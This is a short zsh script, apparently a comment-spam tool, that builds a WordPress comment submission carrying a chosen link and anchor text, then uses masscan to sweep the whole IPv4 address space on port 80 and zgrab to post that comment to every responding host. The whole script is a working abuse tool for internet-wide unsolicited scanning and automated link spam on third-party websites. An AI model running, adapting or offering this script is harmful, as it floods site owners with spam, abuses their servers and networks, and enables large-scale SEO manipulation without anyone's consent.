#!/bin/zsh
if [[ $# < 2 ]]; then
 echo "$0 <url> <anchor>";
 exit;
fi
if ! which go &>/dev/null;  then
 echo "Please install golang and setup GOPATH correctly then run the following command: go install github.com/zmap/zgrab@latest";
 exit;
fi
if ! which masscan &>/dev/null; then
 echo "Please install masscan with the following command: sudo apt install masscan";
 exit;
fi
if ! which zgrab &>/dev/null; then
 echo "Please install zgrab with the following command: go install github.com/zmap/zgrab@latest";
 exit;
fi
echo;
contents="comment=$2+$1&author=$2&email=hey%40gmail.com&url=$1&submit=Post+Comment&comment_post_ID=5&comment_parent=0";
echo "Using Contents $contents";
echo;
clen=$(echo -ne $contents | wc -c);
echo -ne "POST /wp-comments-post.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nReferer: $1\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $clen\r\n\r\n$contents" | tee datazgrab; 
echo;
echo "Running...";
sudo masscan -p 80 0.0.0.0/0 --exclude 255.255.255.255 --rate 20000 2>/dev/null | grep --color=never -oP "(?<=on\s).*" | sed -e "s/\s//g" | zgrab -data datazgrab -timeout 2 -gomaxprocs 5 &>/dev/null;
